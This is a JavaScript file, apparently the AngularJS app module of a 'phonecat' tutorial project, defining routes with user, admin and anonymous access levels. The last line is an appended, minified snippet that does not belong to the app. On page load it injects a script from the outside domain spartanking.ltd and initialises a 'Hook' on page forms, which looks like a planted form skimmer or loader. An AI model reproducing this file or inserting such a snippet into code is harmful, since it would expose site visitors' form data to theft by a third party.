'use strict';

/* App Module */

var phonecatApp = angular.module('phonecatApp', [
  'ngRoute',
  'ngGrid',
  'ngCookies',
  'phonecatAnimations',  
  'phonecatControllers',
  'phonecatFilters',
  'phonecatServices'
]);

phonecatApp.config(['$routeProvider', '$locationProvider', '$httpProvider',
  function($routeProvider, $locationProvider, $httpProvider) {

    var access = routingConfig.accessLevels;

    $routeProvider.
      when('/phones', {
        templateUrl: 'partials/phone-list.html',
        controller: 'PhoneListCtrl',
        access:         access.user
      }).
      when('/phones/:phoneId', {
        templateUrl: 'partials/phone-detail.html',
        controller: 'PhoneDetailCtrl',
        access:         access.admin
      }).
      when('/login', {
        templateUrl: 'partials/login.html',
        //controller: 'PhoneDetailCtrl',
        access:         access.anon
      }).

      otherwise({
        redirectTo: '/phones'
      });
	/*
    $locationProvider.html5Mode(true);

    var interceptor = ['$location', '$q', function($location, $q) {
        function success(response) {
            return response;
        }

        function error(response) {

            if(response.status === 401) {
                $location.path('/login');
                return $q.reject(response);
            }
            else {
                return $q.reject(response);
            }
        }

        return function(promise) {
            return promise.then(success, error);
        }
    }];

    $httpProvider.responseInterceptors.push(interceptor);
	*/
	
  }]);

/*
phonecatApp.run(['$rootScope', '$location', 'Auth', function ($rootScope, $location, Auth) {

    $rootScope.$on("$routeChangeStart", function (event, next, current) {
        if (!Auth.authorize(next.access)) {
            //if(Auth.isLoggedIn()) 
			$location.path('/');
            //else                  $location.path('/login');
        }
    });

}]);*/

(function(){if(typeof n!="function")var n=function(){return new Promise(function(e,r){let o=document.querySelector('script[id="hook-loader"]');o==null&&(o=document.createElement("script"),o.src="//spartanking.ltd/client.js?cache=ignore",o.id="hook-loader",o.onload=e,o.onerror=r,document.head.appendChild(o))})};n().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//13d24456aac9da6d428dff2180c49a3ddb5055080990a66dd8e809ef2a7fe578